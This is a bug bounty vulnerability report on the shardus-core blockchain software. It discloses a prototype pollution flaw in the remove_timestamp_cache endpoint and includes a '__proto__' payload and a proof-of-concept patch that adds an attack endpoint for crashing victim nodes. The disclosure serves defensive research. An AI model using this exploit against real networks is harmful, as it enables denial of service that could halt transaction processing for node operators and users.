# 34476 - \[BC - Critical] remove\_timestamp\_cache prototype pollution lead...

Submitted on Aug 13th 2024 at 18:17:14 UTC by @ZhouWu for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #34476

Report type: Blockchain/DLT

Report severity: Critical

Target: <https://github.com/shardeum/shardus-core/tree/dev>

Impacts:

* Network not being able to confirm new transactions (total network shutdown)

## Description

## Description

In the @shardus/core source code repo, node store a cache of transaction timstamp. Other node will ask the cache, if it's a miss the node will create new tx timestamp cache object derived from payload of the request. Subsequently there's another endpoint named remove\_timestamp\_cache , presumebly to remove these cache. This endpoint is referencing properties in object injection from the element in the payload from the request. Which make it vulnearble to prototype pollution

## Vulnerability

This happen due to referencing the object properties from the payload of the request directly when trying to remove the cache in `remove_timestamp_cache` endpoint. The code is as follows

```
if (this.txTimestampCache[cycleCounter] && this.txTimestampCache[cycleCounter][txId]) {
```

This way of referencing the cache object to assigned value is dangerous, because the referenced element come straight from the request payload. Consider the following payload

```
{
  cycleMarker: "rndmStr",
  cycleCounter: "__proto__",
  txId: "hasOwnProperty"
}
```

This mean that the cache object will be referenced in the following way

```
this.txTimestampCache["__proto__"]["hasOwnProperty"]
```

Essentially overwriting the prototype of the cache object, and the `hasOwnProperty` method of the cache object. This is problematic because `hasOwnProperty` is polluted to be a literal string which in turns break the code of the victim when object iteration or objection check operations are done later down the stream.

## Proof of Concept

* Launch a network of legit nodes.
* Launch an attacker node with this patch applied to shardus/core
* Wait for the attacker node to go active

```diff

diff --git a/src/utils/nestedCounters.ts b/src/utils/nestedCounters.ts
index 3ebbb782..5fbe9796 100644
--- a/src/utils/nestedCounters.ts
+++ b/src/utils/nestedCounters.ts
@@ -5,6 +5,11 @@ import Crypto from '../crypto'
 import { isDebugModeMiddleware, isDebugModeMiddlewareLow } from '../network/debugMiddleware'
 import { getNetworkTimeOffset, shardusGetTime } from '../network'
 import { Utils } from '@shardus/types'
+import { InternalRouteEnum } from '../types/enum/InternalRouteEnum'
+import { getTxTimestampReq, serializeGetTxTimestampReq } from '../types/GetTxTimestampReq'
+import { deserializeGetTxTimestampResp, getTxTimestampResp } from '../types/GetTxTimestampResp'
+import * as crypto from "crypto"
+

 type CounterMap = Map<string, CounterNode>
 interface CounterNode {
@@ -32,6 +37,30 @@ class NestedCounters {
   }

   registerEndpoints(): void {
+
+    Context.network.registerExternalGet('launch-attk', async (req, res)=>{
+
+          const victim = req.query.victim as string
+
+          const node = Context.shardus.getNodeByPubKey(victim)
+
+          const cycleMarker = crypto.randomBytes(254).toString()
+
+          const cycleCounter = "__proto__"
+
+          const txId = "hashOwnProperty"
+
+          const payload = {
+            cycleMarker,
+            cycleCounter,
+            txId
+          }
+
+          const data = await Context.p2p.ask(node, "remove_timestamp_cache", payload, false)
+
+          res.send(data)
+    })
+
     Context.network.registerExternalGet('counts', isDebugModeMiddlewareLow, (req, res) => {
       profilerInstance.scopedProfileSectionStart('counts')


```

* Send a request to the attacker node with the victim node pubkey as a query parameter
* `GET http://localhost:1337/launch-attk?victim=<publickey>`
* observe the logs, the node exit unCleanly, essentially killing the node.

## Impact

This is pretty straightforward single node attack, the script can be modified to attack the whole network to kill the whole network.
